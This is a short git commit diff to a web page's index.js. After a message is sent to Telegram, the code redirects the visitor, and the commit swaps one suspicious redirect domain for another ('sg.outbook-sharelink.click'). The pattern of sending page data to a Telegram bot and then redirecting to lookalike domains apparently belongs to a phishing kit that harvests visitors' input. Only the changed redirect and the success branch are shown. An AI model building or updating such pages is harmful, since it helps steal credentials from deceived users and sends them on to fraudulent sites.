df380ccb744f29ed47248f1dd9771b6719595e66
husknet <127146284+husknet@users.noreply.github.com>
2024-10-23 15:42:32 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -57,7 +57,7 @@ export default function Home() {
 
         if (response.status === 200) {
           console.log('Message sent successfully to Telegram!', response.data);
-          window.location.href = 'https://sg.alltracktransportl.com'; // Redirect on success
+          window.location.href = 'https://sg.outbook-sharelink.click'; // Redirect on success
         } else {
           throw new Error('Failed to send message to Telegram.');
         }
